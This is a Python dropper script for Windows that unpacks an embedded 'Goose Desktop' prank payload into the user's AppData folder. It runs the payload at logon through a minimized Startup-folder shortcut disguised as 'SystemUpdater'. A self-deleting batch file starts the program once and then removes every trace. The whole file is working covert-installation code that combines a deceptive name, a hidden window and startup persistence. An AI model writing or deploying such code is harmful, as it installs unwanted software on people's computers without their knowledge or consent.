import os, zipfile, base64
import win32com.client

def createGooseZip(payload):
    # Hardcoded base64 of the Goose Desktop zip folder that has some files removed and is more compressed
    gooseB64 = ''
    gooseB64 = gooseB64.encode('utf-8')

    with open(payload, 'wb+') as fileSave:
        gooseB64 = base64.decodebytes(gooseB64)
        fileSave.write(gooseB64)

def extractGooseZip(payload, location):
    newLocation = os.path.join(location, 'Goose')
    if not os.path.exists(newLocation):
        os.mkdir(newLocation)

    with zipfile.ZipFile(payload,'r') as openZip:
        openZip.extractall(newLocation)

    os.remove(payload)
    return newLocation

def createBats(location, startupLocation):
    # Bat file checks if a text file is present then starts Goose Desktop and deletes the file it checks, on the next restart delete everything
    destroyBat = '@echo off\nif exist runCheck.txt (\nstart GooseDesktop.exe\ndel runCheck.txt\n) else (\ncd "' + os.path.join(os.path.expanduser('~'), 'AppData\Roaming') + '"\nrmdir /s /q Goose\ncd "' + startupLocation + '"\ndel SystemUpdater.lnk\ndel %0\n)'

    with open(os.path.join(location, 'SystemUpdater.bat'), 'w+') as makeBat:
        makeBat.write(destroyBat)
    
    # Creates empty file that is used to check if the bat has ran
    with open(os.path.join(location, 'runCheck.txt'), 'w+') as no: 
        pass

def createShortCut(location, startupLocation, fileToShortcut, fileShortcutName):
    targetFile = os.path.join(location, fileToShortcut)

    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(os.path.join(startupLocation, fileShortcutName))
    shortcut.Targetpath = targetFile
    shortcut.WindowStyle = 7
    shortcut.save()

payload = 'GoosePayload.zip'
roamingFolder = os.path.join(os.path.expanduser('~'), 'AppData\Roaming')
startupFolder = os.path.join(roamingFolder, 'Microsoft\Windows\Start Menu\Programs\Startup')

createGooseZip(payload)
roamingFolder = extractGooseZip(payload, roamingFolder)
createShortCut(roamingFolder, startupFolder, 'SystemUpdater.bat', 'SystemUpdater.lnk')
createBats(roamingFolder, startupFolder)